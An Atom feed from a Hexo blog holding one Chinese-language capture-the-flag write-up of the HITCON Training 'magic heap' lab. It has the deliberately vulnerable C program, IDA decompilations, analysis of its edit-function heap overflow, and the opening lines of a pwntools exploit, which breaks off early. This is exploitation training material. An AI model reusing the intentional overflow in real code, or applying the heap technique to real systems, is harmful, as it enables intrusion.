<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ky不是枕木</title>
  
  <subtitle>分享学习经验</subtitle>
  <link href="https://kylinxin.github.io/atom.xml" rel="self"/>
  
  <link href="https://kylinxin.github.io/"/>
  <updated>2023-09-13T15:02:03.029Z</updated>
  <id>https://kylinxin.github.io/</id>
  
  <author>
    <name>Kylinxin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HITCON Training lab14 magic heap</title>
    <link href="https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/"/>
    <id>https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/</id>
    <published>2023-09-15T04:58:29.000Z</published>
    <updated>2023-09-13T15:02:03.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="unsortedbin-attack（例题）"><a href="#unsortedbin-attack（例题）" class="headerlink" title="unsortedbin_attack（例题）"></a><strong>unsortedbin_attack（例题）</strong></h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p class='item-img' data-src='https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png'><img src="https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png" alt="Snipaste_2023-09-13_21-07-19.png"></p><p>文件没开PIE，got表可写，开启了Canary和NX保护，64位程序。</p><h2 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_input</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span> {<br>  <span class="hljs-type">int</span> ret;<br>  ret = read(<span class="hljs-number">0</span>, buf, size);<br>  <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>    _exit(<span class="hljs-number">-1</span>);<br>  }<br>}<br><br><span class="hljs-type">char</span> *heaparray[<span class="hljs-number">10</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> magic = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">size_t</span> size = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {<br>    <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[idx], size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">free</span>(heaparray[idx]);<br>    heaparray[idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span> { system(<span class="hljs-string">"cat ./flag"</span>); }<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">switch</span> (atoi(buf)) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      create_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      edit_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      delete_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4869</span>:<br>      <span class="hljs-keyword">if</span> (magic &gt; <span class="hljs-number">4869</span>) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>        l33t();<br>      } <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br></code></pre></td></tr></tbody></table></figure><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      delete_heap();<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">3</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4869</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)magic &lt;= <span class="hljs-number">4869</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>          l33t();<br>        }<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>LABEL_17:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    {<br>      create_heap();<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      edit_heap();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>看一看就行，接下来看具体函数功能</p><h3 id="l33t-存在后门函数"><a href="#l33t-存在后门函数" class="headerlink" title="l33t 存在后门函数"></a>l33t 存在后门函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"cat /home/magicheap/flag"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020B</span>9                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020</span>C0                 public magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; __int64 magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 magic           dq ?                    ; DATA XREF: main:loc_400D05↑r<br>.bss:<span class="hljs-number">00000000006020</span>C8                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020E0</span>                 public heaparray<br>.bss:<span class="hljs-number">00000000006020E0</span> ; heap *heaparray[<span class="hljs-number">10</span>]<br>.bss:<span class="hljs-number">00000000006020E0</span> heaparray       dq ?                    ; DATA XREF: create_heap+<span class="hljs-number">30</span>↑r<br>.bss:<span class="hljs-number">00000000006020E0</span>                                         ; create_heap+<span class="hljs-number">8</span>C↑w ...<br></code></pre></td></tr></tbody></table></figure><p>magic ：00000000006020C0</p><p>heap_ptr ：00000000006020E0</p><h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>打印菜单</p><h3 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (heap *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入大小，创建相应大小的堆</p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>重新输入大小，更新内容，大小由我们定，存在堆溢出哦！！！</p><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(heaparray[v1]);<br>    heaparray[v1] = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><p>正常free操作，指针清0，不存在uaf</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./magicheap'</span>)<br>p = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">29691</span>)<br><br><span 